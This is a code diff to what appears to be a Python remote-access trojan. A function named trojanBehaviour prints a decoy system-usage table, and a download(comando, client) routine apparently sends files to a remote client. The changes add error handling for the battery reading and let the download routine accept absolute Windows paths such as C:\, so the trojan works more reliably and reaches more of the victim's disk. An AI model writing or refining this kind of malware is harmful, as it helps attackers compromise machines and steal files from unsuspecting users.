@@ -35,7 +35,10 @@ def trojanBehaviour():
             ram =  psutil.virtual_memory().percent
             disk = psutil.disk_usage("/").percent
             mem= psutil.swap_memory().percent
-            battery= psutil.sensors_battery().percent
+            try:
+                battery= psutil.sensors_battery().percent
+            except:
+                battery = 0
 
 
 
@@ -45,11 +48,12 @@ def trojanBehaviour():
             print("              ------------------------------------------------------------- ")
             print(Fore.RESET + "             |"+Fore.GREEN + " CPU USAGE"+Fore.RESET+" |"+Fore.GREEN + " RAM USAGE"+Fore.RESET+" |"+Fore.GREEN + " DISK USAGE"+Fore.RESET+" |"+Fore.GREEN + " MEMORY USAGE"+Fore.RESET+" |"+Fore.GREEN + " BATTERY"+Fore.RESET+" |")
             print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%          | {:02}%     |".format(int(cpu),
-                                                                                                              int(ram),
-                                                                                                              int(disk),
-                                                                                                              int(mem),
-                                                                                                              int(battery)))
+                                                                                                            int(ram),
+                                                                                                            int(disk),
+                                                                                                            int(mem),
+                                                                                                            int(battery)))
             print("              ------------------------------------------------------------- ")
+
 
             if platform.system() == "Windows":
                 process = subprocess.Popen('tasklist /fi "MEMUSAGE gt 100000"', stdout=subprocess.PIPE,
@@ -254,7 +258,7 @@ def download(comando, client):
             pathtoremember = os.getcwd()
             os.chdir(os.getcwd() + path[1:])
             path = os.getcwd()
-        elif path.startswith("\\") or path.startswith("/"):
+        elif path.startswith("C:\\") or path.startswith("\\") or path.startswith("/"):
             pathtoremember = os.getcwd()
             os.chdir(path)
             path = os.getcwd()
